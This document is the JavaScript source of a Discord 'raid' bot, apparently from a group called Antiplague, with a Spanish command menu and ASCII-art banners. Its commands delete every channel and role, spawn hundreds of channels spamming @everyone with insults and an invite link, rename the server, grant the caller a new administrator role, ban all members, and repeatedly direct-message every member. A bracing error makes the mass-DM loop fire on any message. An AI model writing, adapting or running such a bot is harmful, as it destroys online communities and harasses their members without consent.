const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');

client.on("ready", () => {


console.log(chalk.red(`
                                            
                                           :::;;;;:;:::::::::::::,,,,:,::::::::,,,,,,,.,..,,,,,::::,::::::;;:;:;;;;;;:;;;;
                                          ,::::;:;;::::::::::,:::,,,,,:,:::::;;i;;;;,,,,,,,,,,,:,,,:,:::;;;;;;;;;;:;::;;i;i
                                         ;:::;;;;;;;::::::::::::::::;;*#nxn#+#zzz###z#+*;,,,,:,,::::::::;:;:;::::;;;;;;;;;i;
                                        ::,:::;::;;::::;:;::::,:,;*#n#*i;;;::;;;:;i*z#nzMn*:.,,,,,,,,::::;:;;;;;:;;;:;;;;;;;;
                                        ,::::;;;;;;;::::::::::;+#+;::::;;;;:;:;i**#nxnxnnnn;...,,:,,::::;:;::;:;;;:;;;i;;;i;;
                                        ::::::;:::::::,,::,:;#+;::;::,:::;:::;+#znMWWMMMxx+..,,,,,,,,,,,;:::;:::;;:;;i;;i;i;;
                                        ,:::::;;:;::::::::i+i;::::::::::::;::;i++#MWWMWMx#,..,,,,,,,,,::;:;:;::::;;;::;:;;;;;
                                        :::::;;;;:;:::,:::**,::::,::::;:;;;:::;+++xxMxxnni,..,,,,,,:::::;::::::::;::;;;;;;;;;
                                        :::::::;::::,,,:,::++i,::;:::,::::,::,:;i*+znxxxx:,,,,,,,::::,::;:::;;:;;i;;;;;;;;;;;
                                        :;:::;:;:;:;,,,:,:::*z;;::,:::::::::::;:;*#zznMMn:,,,,.,,:,::,::;:;:::;:;;;;;;;;;;;;;
                                        :;:;:::::;:::,,:,:,,:++;::::::;:;:;;i#n##nxxxnxxz##+#+#+i;;::::;;:;::::::;;;;;;i;iiii
                                        :;::;;;;:;::::::::::;;n;::::;i+zzzz#+*#ii*+z#zz#*+#+######nz+i::;:::;:;:;;;;;;;;;i;;;
                                        :;;;::;:::::,::,::;:,:+*i*+z++*ii*+nxMWW@WWMxnMMnWMWMxnMMxxznnz+;:::::::;;;;;;;;;;ii*
                                        :::::::::::;:::::::;;+z#*ii#zxMMMWWWMMxxxnxx#++#nMxMn+nxxxnnnz+;;,::::;;;;;;;;;;iiiii
                                        :::::;:;:;::;:::;i++*i*z#nWMM@@MM@Mz+***ii;;;;*#xWxxMnxzxz#+;,,:;:::::;:;;;;;;;;;;ii;
                                        :;::::::;:::::;+#*i#x@WMn+xz*xxxxx;:::;;*i;::;*#xWxz+*i;:,,,,,,:;:::::;:;;;;;;;;iiiii
                                        ::::::;:;;::;**i#x@@MWx+ni*i*zMzWW:,,:;*i;i*+i**n;:,,,,,,,,:,,::;:::;;;;;;;;;;;;;;;ii
                                        ::;:::::::;+i;zMW@@@@WnxM*iii+x+#W*,:;i;++#i#n#zzz#z#;:,,,,:,,,:;::::::;:;;;;;;;;;;;;
                                        ::;:::::::**zWWWWWW@WxMWMzi*;*#i;Mx::*;*i+x+#x;:::;i*nMz;:,:,,,::::::,:;;;;;;;;;;;;i;
                                        :;:;;::::::#nxMMWWMMxMMMMn:*;*ii:+Wi:*i**xx#*n;:;;;::;iznzi,,,::;:;:;:;:;::;:;:;;;;i;
                                        :::::::::::;,:i*++#++i;;:*:*i;;;:;Mx:i;#i;+i#+:::::::::;;*z#*::::::::::::::;;;;;;i;;;
                                        :::::::::::::,:::;::::::::i**:i:,:#W*,i;+#+*#;:;:::::::::::*nn+:::::;:;:;;;;;;;;;i;i;
                                        :::;:::::::::::,,:,,,:,:,,i;+;i;::;Wx;;*+*#*;;:;::ii;:::::::;*Mx*::::::::::;;;;;;;;;;
                                        :::,:::::::::,::::::::::::;;+:;*:::iWz::,:::::;;;*nnz#+i;i;:::izW+,,::::;;;;;;;;;;ii;
                                        ::::;::::::,:::::,:::,:,::;;+;:*;,::+@z:::;;;i;;;iiii*#zn#+i;::;+x#::::::::;:::;;;;;;
                                        :::::::,:::::,,::,,::::::::;*i:i#;::;#W#:,::;::::;iiiii;;;i++i:;;+x*:,::::;;;;:;;;;;;
                                        ::;:::::::::::::,:::::::,:;;;*::nz::;:zWz;;i;:;iiizznMxnnzz+++#i::*zi:::;:;;;;;;;;;i;
                                        ::::::::::::,,:,:::,::::::::;+::*M*::;:#WMz+i#nzxMWz#+**i*++#nnxz*:;#;:::::::::::;:;;
                                        :,::,:::::::,::,:;;::::::::::*;;:nM*:;i:;xWWMxMWWx;,,,,,:,:::;*zzi#*++,:::;:::;:::;;;
                                        ;::::::,,:,,,,:,::::,,::,,ii,*;,:iW@n;;i;:iznMxznn;,,,:,,,,::,,:;i#nn#::,::::::::;:;;
                                        ::,:,,,::,:,:,,,,,:,,,,,,,+*,ii,,:*W@M*;*#+***+nMn,,,,,,,,,::::::::;#z;::::::::::::::
                                        :::::::::::,:,,,:,,,,,,,,:z+:;*::::*MW@n;:izMMWWxi,:,,,,:::::,:::,,::i::::::;:::::;;;
                                        ::::::::,,,,,,,.,,,,,,,,,,Mn::i:,:,:ixWW@x++i*nxi:,,,,,,,,,,::::;:::::::;:;:;;:;:;:;:
                                        ,::::::,:,:,,,:,,,::,,:::;Mx;:i;,::::izW@@@Wxxx*,,,,,,,,:,:,::::::::::::;;:::::::;:;:
                                        :,:::::,,,,,,,:,,,,,,,,,,#Wni,:;,::::;;zW@@@@xn:,,,:,,,,,,,::,::::::::::::;:::;:;:;;:
                                        ,,,,:::,:,,.,,,,,,,,:,,,:xn#i,,;:::::::;#W@@@Wn::,:,,,,,,,:::::::::::;::::;::::::;;;:
                                         ::::::,:,,,,,,,,,,,,,,:iMz*i,::::::::::ixWWW@x:,,,,,,:::,,:::::::::::::::::::::::;:
                                          ,,,,,,:,,,,,,,,,,.,,,:nz+**,,,,:,,,::;;+xMMxx;,:,:,,,,,,,,,:::,::::::;:;:;::;:;:;
                                           ,,,,,:,,,,.,,,,:,,::*#****:,::::::;:::;#xMMM*,,,,,,,,,,,,:,:::::::::;::;:;:;:::
                                            
`))

console.log(chalk.red(`

                                              ██████╗  █████╗ ████████╗   █████╗ ███████╗██╗ █████╗ ██╗ █████╗ ██╗
                                              ██╔══██╗██╔══██╗╚══██╔══╝  ██╔══██╗██╔════╝██║██╔══██╗██║██╔══██╗██║░░
                                              ██████╦╝██║░░██║░ ░██║░░   ██║░░██║█████╗  ██║██║░░╚═╝██║███████║██║░░░
                                              ██╔══██╗██║░░██║░ ░██║░░   ██║░░██║██╔══╝  ██║██║░░██╗██║██╔══██║██║░░░░
                                              ██████╦╝╚█████╔╝   ██║░    ╚█████╔╝██║░    ██║╚█████╔╝██║██║  ██║███████╗
                                              ╚═════╝  ╚════╝    ╚═╝      ╚════╝ ╚═╝     ╚═╝ ╚════╝ ╚═╝╚═╝  ╚═╝╚══════╝
                                              
                                   ██████╗ ███████╗   █████╗ ███╗  ██╗████████╗██╗██████╗ ██╗      █████╗  ██████╗ ██╗   ██╗███████╗
                                   ██╔══██╗██╔════╝  ██╔══██╗████╗░██║╚══██╔══╝██║██╔══██╗██║░    ██╔══██╗██╔════╝░██║░░░██║██╔════╝
                                   ██║░░██║█████╗░░  ███████║██╔██╗██║░░░██║░░░██║██████╔╝██║░░   ███████║██║░░██╗░██║░░░██║█████╗░
                                   ██║░░██║██╔══╝░░  ██╔══██║██║╚████║ ░░██║░░ ██║██╔═══╝ ██║░░░  ██╔══██║██║░░╚██╗██║░░░██║██╔══╝░
                                   ██████╔╝███████╗  ██║░░██║██║░╚███║  ░██║░░ ██║██║░░   ███████╗██║░░██║╚██████╔╝╚██████╔╝███████╗
                                   ╚═════╝ ╚══════╝  ╚═╝  ╚═╝╚═╝  ╚══╝   ╚═╝   ╚═╝╚═╝     ╚══════╝╚═╝░░╚═╝░╚═════╝░░╚═════╝░╚══════╝


`))



console.log(chalk.cyan(`
                                          [+] Comandos:
                                          
                                           ღ .on | Jode el servidor de inmediato, ejecutando todos los comandos.
                                           ღ .nuke | Elimina todos los chats, dejando solo 1 para poner otros comandos.
                                           ღ .raid | Crea muchos canales con ping y mensajes.
                                           ღ .admin | Crea un rol con perms de administrador y te lo da.
                                           ღ .crearroles / . eliminarroles | Crea o elimina roles del servidor
                                           ღ .banall | Este comando banea a todos los usuarios del servidor (algunas veces falla)
                                           ღ .mdall | Envia multiples mensajes a todos los miembros del servidor
                                           ღ .lista | Obten informacion del raid (stats)


`))


   presencia();  
    });



function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Bot oficial de Antiplague - Samy2005",
  type: "PLAYING"

}
  });
}


//automatico

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === '.on'){

    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))


      message.delete()
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`antiplague-is-here`, {
        type: 'text'
      }).then(channel => {
        channel.send("#AntiplagueOnTop")
      })
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`antiplague-is-here`, {
           type: 'text'
         }).then(channel => {
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
           
           
       })
       }
       message.guild.setName("#Antiplague");
       message.guild.setIcon("https://media.discordapp.net/attachments/863557423175827467/866724266288742450/Screenshot_20201221_123244.jpg?width=472&height=480");
     }
})


//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('.admin')){
    let rol = await msg.guild.roles.create({data: {
      name: "$",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});


//lista


client.on("message", message => {


    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '.lista') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle("Informacion de proceso del raid")
       .setThumbnail()
       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});


//banall

client.on("message", async message => {
    if(message.content.startsWith('.banall')){
      message.delete();
      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.ban();
        }
      })
    }});


//nuke 

client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.nuke') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`clown`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://cdn.discordapp.com/attachments/716693329437524029/807759708714827807/banner_nuevo_de_ap.png")
        })
         }
      })


//chats

client.on("message", message => {


            if (message.author.bot) return;
          
           if (message.content === '.raid') {
            message.delete()
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`Attacked by Antiplague`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  channel.send("@everyone **Your server has been raided by Antiplague, clown! - Samy2005** https://discord.gg/Ddk2a9JJg6 , https://imgur.com/zDbMzvu");
                  
              })
              }
              }
            });

//mdall

client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".mdall")
                        message.delete()
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("El servidor en el que estabas fue atacado por Antiplague, seguridad de mierda! / The server you were on was attacked by Antiplague, fucking security! - https://discord.gg/Ddk2a9JJg6").catch(error => {});
                        },450);
                      })
                      });


//borrar roles

client.on("message", message => {


                    if (message.author.bot) return;
                  
                     if(message.content === ('.eliminarroles')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });

//crear roles

client.on("message", message => {

                if (message.author.bot) return;
              
               if (message.content === '.crearroles') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `Antiplague Brand`,color: '#d41818',},reason: 'razon',})
              };
               }
                });




client.login("aqui el token");